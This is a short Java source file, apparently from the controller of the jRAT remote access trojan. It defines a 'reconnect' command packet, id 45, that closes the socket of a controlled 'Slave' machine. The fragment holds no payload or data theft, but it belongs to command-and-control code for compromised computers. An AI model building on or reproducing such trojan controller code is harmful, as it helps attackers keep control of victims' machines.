package io.jrat.controller.packets.outgoing;

import io.jrat.controller.Slave;
import io.jrat.controller.exceptions.CloseException;

import java.io.DataOutputStream;


public class Packet45Reconnect extends AbstractOutgoingPacket {

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.closeSocket(new CloseException("Reconnecting"));
	}

	@Override
	public short getPacketId() {
		return 45;
	}

}
